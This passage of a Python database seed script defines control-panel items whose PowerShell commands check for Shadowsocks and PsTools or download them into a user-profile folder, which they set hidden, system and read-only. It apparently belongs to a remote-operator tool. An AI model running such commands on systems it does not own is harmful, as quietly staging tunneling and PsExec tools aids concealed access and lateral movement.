            "command": '''$bm="$env:USERPROFILE\\binary_module";$ssp="$bm\\shadowsocks";$sslocal="$ssp\\sslocal.exe";$ssserver="$ssp\\ssserver.exe";$scLocal=Get-Command sslocal -EA SilentlyContinue;$scServer=Get-Command ssserver -EA SilentlyContinue;if($scLocal){Write-Host "[+] Shadowsocks sslocal found in PATH: $($scLocal.Source)"}elseif(Test-Path $sslocal){Write-Host "[+] Shadowsocks sslocal found: $sslocal"}else{Write-Host "[-] Shadowsocks sslocal not found"};if($scServer){Write-Host "[+] Shadowsocks ssserver found in PATH: $($scServer.Source)"}elseif(Test-Path $ssserver){Write-Host "[+] Shadowsocks ssserver found: $ssserver"}else{Write-Host "[-] Shadowsocks ssserver not found"};if((-not $scLocal) -and (-not (Test-Path $sslocal)) -and (-not $scServer) -and (-not (Test-Path $ssserver))){Write-Host "[*] Run 'Install Shadowsocks' to install it"}''',
            "execution_type": "powershell",
            "order_index": 6,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Check if Shadowsocks is installed on the system",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-install-shadowsocks",
            "section_id": "sec-binary-mgmt",
            "name": "install_shadowsocks",
            "label": "Install Shadowsocks",
            "icon": "fas fa-download",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$ssp="$bm\\shadowsocks";$zp="$bm\\shadowsocks.zip";$url="https://github.com/shadowsocks/shadowsocks-rust/releases/download/v1.24.0/shadowsocks-v1.24.0.x86_64-pc-windows-gnu.zip";if(-not(Test-Path $bm)){New-Item -ItemType Directory -Path $bm -Force|Out-Null;Write-Host "[+] Created: $bm"};attrib +h +s +r "$bm"|Out-Null;$sslocal="$ssp\\sslocal.exe";$ssserver="$ssp\\ssserver.exe";if((Test-Path $sslocal) -or (Test-Path $ssserver)){Write-Host "[!] Shadowsocks already installed";if(Test-Path $sslocal){Write-Host "  Found: $sslocal"};if(Test-Path $ssserver){Write-Host "  Found: $ssserver"};exit 0};Write-Host "[*] Downloading Shadowsocks...";try{Start-BitsTransfer -Source $url -Destination $zp -EA Stop;Write-Host "[+] Downloaded"}catch{Write-Host "[-] Download failed: $_";exit 1};Write-Host "[*] Extracting...";try{if(Test-Path $ssp){Remove-Item $ssp -Recurse -Force};$tep="$bm\\temp_shadowsocks";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};Expand-Archive -Path $zp -DestinationPath $tep -Force;$extractedFiles=Get-ChildItem -Path $tep -Recurse -File -Filter "*.exe";if($extractedFiles.Count -gt 0){New-Item -ItemType Directory -Path $ssp -Force|Out-Null;foreach($file in $extractedFiles){Move-Item -Path $file.FullName -Destination "$ssp\\$($file.Name)" -Force};Get-ChildItem -Path $tep -Directory|ForEach-Object{Remove-Item $_.FullName -Recurse -Force -EA SilentlyContinue};Remove-Item $tep -Recurse -Force -EA SilentlyContinue;Write-Host "[+] Extracted"}else{Write-Host "[-] No executables found in archive";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}}catch{Write-Host "[-] Extract error: $_";if(Test-Path $tep){Remove-Item $tep -Recurse -Force -EA SilentlyContinue};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1};if((Test-Path $sslocal) -or (Test-Path $ssserver)){Write-Host "[+] Shadowsocks installed successfully";if(Test-Path $sslocal){Write-Host "  sslocal.exe: $sslocal"};if(Test-Path $ssserver){Write-Host "  ssserver.exe: $ssserver"};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue}}else{Write-Host "[-] Verification failed - executables not found";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}''',
            "execution_type": "powershell",
            "order_index": 7,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Download and install Shadowsocks to binary_module directory",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-check-pstools",
            "section_id": "sec-binary-mgmt",
            "name": "check_pstools",
            "label": "Check PsTools",
            "icon": "fas fa-search",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$ptp="$bm\\pstools";$psexec="$ptp\\PsExec.exe";$psinfo="$ptp\\PsInfo.exe";$pslist="$ptp\\pslist.exe";$scExec=Get-Command PsExec -EA SilentlyContinue;$scInfo=Get-Command PsInfo -EA SilentlyContinue;$scList=Get-Command pslist -EA SilentlyContinue;if($scExec){Write-Host "[+] PsExec found in PATH: $($scExec.Source)"}elseif(Test-Path $psexec){Write-Host "[+] PsExec found: $psexec"}else{Write-Host "[-] PsExec not found"};if($scInfo){Write-Host "[+] PsInfo found in PATH: $($scInfo.Source)"}elseif(Test-Path $psinfo){Write-Host "[+] PsInfo found: $psinfo"}else{Write-Host "[-] PsInfo not found"};if($scList){Write-Host "[+] pslist found in PATH: $($scList.Source)"}elseif(Test-Path $pslist){Write-Host "[+] pslist found: $pslist"}else{Write-Host "[-] pslist not found"};$found=$false;if($scExec -or (Test-Path $psexec) -or $scInfo -or (Test-Path $psinfo) -or $scList -or (Test-Path $pslist)){$found=$true};if(-not $found){Write-Host "[*] Run 'Install PsTools' to install it"}else{Write-Host "[+] PsTools is installed"}''',
            "execution_type": "powershell",
            "order_index": 8,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Check if PsTools is installed on the system",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-install-pstools",
            "section_id": "sec-binary-mgmt",
            "name": "install_pstools",
            "label": "Install PsTools",
            "icon": "fas fa-download",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$ptp="$bm\\pstools";$zp="$bm\\pstools.zip";$url="https://download.sysinternals.com/files/PSTools.zip";if(-not(Test-Path $bm)){New-Item -ItemType Directory -Path $bm -Force|Out-Null;Write-Host "[+] Created: $bm"};attrib +h +s +r "$bm"|Out-Null;$psexec="$ptp\\PsExec.exe";$psinfo="$ptp\\PsInfo.exe";if((Test-Path $psexec) -or (Test-Path $psinfo)){Write-Host "[!] PsTools already installed";if(Test-Path $psexec){Write-Host "  Found: $psexec"};if(Test-Path $psinfo){Write-Host "  Found: $psinfo"};exit 0};Write-Host "[*] Downloading PsTools...";try{Start-BitsTransfer -Source $url -Destination $zp -EA Stop;Write-Host "[+] Downloaded"}catch{Write-Host "[-] Download failed: $_";exit 1};Write-Host "[*] Extracting...";try{if(Test-Path $ptp){Remove-Item $ptp -Recurse -Force};$tep="$bm\\temp_pstools";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};Expand-Archive -Path $zp -DestinationPath $tep -Force;$extractedFiles=Get-ChildItem -Path $tep -Recurse -File -Filter "*.exe";if($extractedFiles.Count -gt 0){New-Item -ItemType Directory -Path $ptp -Force|Out-Null;foreach($file in $extractedFiles){Move-Item -Path $file.FullName -Destination "$ptp\\$($file.Name)" -Force};Get-ChildItem -Path $tep -Directory|ForEach-Object{Remove-Item $_.FullName -Recurse -Force -EA SilentlyContinue};Remove-Item $tep -Recurse -Force -EA SilentlyContinue;Write-Host "[+] Extracted $($extractedFiles.Count) executables"}else{Write-Host "[-] No executables found in archive";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}}catch{Write-Host "[-] Extract error: $_";if(Test-Path $tep){Remove-Item $tep -Recurse -Force -EA SilentlyContinue};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1};if((Test-Path $psexec) -or (Test-Path $psinfo)){Write-Host "[+] PsTools installed successfully";$installedFiles=Get-ChildItem -Path $ptp -Filter "*.exe";Write-Host "  Installed $($installedFiles.Count) tools:";foreach($file in $installedFiles){Write-Host "    - $($file.Name)"};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue}}else{Write-Host "[-] Verification failed - executables not found";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}''',
            "execution_type": "powershell",
            "order_index": 9,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Download and install PsTools (Sysinternals) to binary_module directory",
            "created_at": now,
            "updated_at": now
        }
    ]
}

async def clear_existing_data():
    """Clear existing module data"""
    print("\n[*] Clearing existing module data...")
    try:
        # Delete in correct order (items -> sections -> categories)
        async with db._get_connection() as conn:
            cursor = await conn.cursor()
            await cursor.execute("DELETE FROM module_items")
            print("  ✅ Cleared items")
            await cursor.execute("DELETE FROM module_sections")
            print("  ✅ Cleared sections")
            await cursor.execute("DELETE FROM module_categories")
            print("  ✅ Cleared categories")
    except Exception as e:
        print(f"  ⚠️  Warning: {e}")

async def seed_complete_database():
    """Populate database with complete seed data"""
    print("=" * 70)
    print("Seeding Complete Module Control Panel Database")
    print("=" * 70)
    
    # Clear existing data first
    await clear_existing_data()
    
    # Seed Categories
    print("\n[1/3] Seeding Categories...")
    for category in COMPLETE_SEED_DATA["categories"]:
        try:
            await db.add_module_category(category)
            print(f"  ✅ Added category: {category['label']}")
        except Exception as e:
            print(f"  ❌ Error adding category {category['label']}: {e}")
    
    # Seed Sections
    print("\n[2/3] Seeding Sections...")
    for section in COMPLETE_SEED_DATA["sections"]:
        try:
            await db.add_module_section(section)
            print(f"  ✅ Added section: {section['label']} ({section['category_id']})")
        except Exception as e:
            print(f"  ❌ Error adding section {section['label']}: {e}")
    
    # Seed Items
    print("\n[3/3] Seeding Items...")
    for item in COMPLETE_SEED_DATA["items"]:
        try:
            await db.add_module_item(item)
            print(f"  ✅ Added item: {item['label']} ({item['section_id']})")
        except Exception as e:
            print(f"  ❌ Error adding item {item['label']}: {e}")
    
    print("\n" + "=" * 70)
    print("Seeding completed!")
    print("=" * 70)
    
    # Display summary
    categories = await db.get_module_categories()
    sections = await db.get_module_sections()
    items = await db.get_module_items()
    
    print(f"\nSummary:")
    print(f"  Categories: {len(categories)}")
    print(f"  Sections: {len(sections)}")
    print(f"  Items: {len(items)}")
    print()

if __name__ == "__main__":
    asyncio.run(seed_complete_database())

